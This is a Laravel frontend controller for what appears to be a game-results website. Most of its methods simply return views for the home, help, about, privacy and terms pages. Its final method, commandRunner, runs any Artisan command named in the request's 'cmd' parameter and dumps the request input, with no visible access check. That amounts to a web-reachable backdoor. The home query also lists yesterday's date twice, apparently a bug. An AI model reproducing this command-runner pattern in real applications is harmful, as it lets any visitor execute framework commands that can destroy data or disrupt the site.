<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Game;
use Carbon\Carbon;

class IndexController extends Controller
{
    public function home(Request $request)
    {        
        $games = Game::with(['results' => function ($query) {
            $query->whereIn('result_date', [
                Carbon::today()->format('Y-m-d'),
                Carbon::yesterday()->format('Y-m-d'),
                Carbon::yesterday()->format('Y-m-d')
            ])
            ->orderBy('result_date', 'desc');
        }])->get();


        return view('frontend.home', compact('games'));
    }
    public function help()
    {
        return view('frontend.help.index');
    }
    public function howWork()
    {
        return view('frontend.how-it-works.index');
    }
    public function aboutUs()
    {
        return view('frontend.about-us.index');
    }
    public function privacy()
    {
        return view('frontend.privacy-policy.index');
    }
    public function terms()
    {
        return view('frontend.terms-of-use.index');
    }
    public function commandRunner(Request $request){
        \Illuminate\Support\Facades\Artisan::call($request->cmd);
        dd($request->all());
    }
}
